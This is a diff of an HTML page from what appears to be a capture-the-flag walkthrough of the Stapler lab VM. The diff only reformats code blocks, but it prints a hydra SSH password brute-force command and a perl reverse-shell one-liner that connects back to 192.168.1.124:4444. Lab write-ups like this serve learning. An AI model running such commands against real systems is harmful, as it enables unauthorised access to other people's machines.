@@ -266,7 +266,9 @@ Using netcat to connect to port 666 we see a bunch of gibberish.</p>
 
 <h2 id="bruteforce">Bruteforce</h2>
 
-<p><code class="highlighter-rouge">hydra -L users.txt -P /usr/share/SecLists/Passwords/500-worst-passwords.txt 192.168.1.116 ssh</code></p>
+<div class="highlighter-rouge"><pre class="highlight"><code>hydra -L users.txt -P /usr/share/SecLists/Passwords/500-worst-passwords.txt 192.168.1.116 ssh
+</code></pre>
+</div>
 
 <p><img src="/assets/images/stapler/image14.png" alt="Bruteforce" /></p>
 
@@ -298,7 +300,9 @@ Using netcat to connect to port 666 we see a bunch of gibberish.</p>
 
 <p>I added a reverse shell using perl to this script:</p>
 
-<p><code class="highlighter-rouge">perl -e 'use Socket;$i="192.168.1.124";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))) {open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'</code></p>
+<div class="highlighter-rouge"><pre class="highlight"><code>perl -e 'use Socket;$i="192.168.1.124";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))) {open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'
+</code></pre>
+</div>
 
 <p><img src="/assets/images/stapler/image18.png" alt="reverse shell in script" /></p>
 
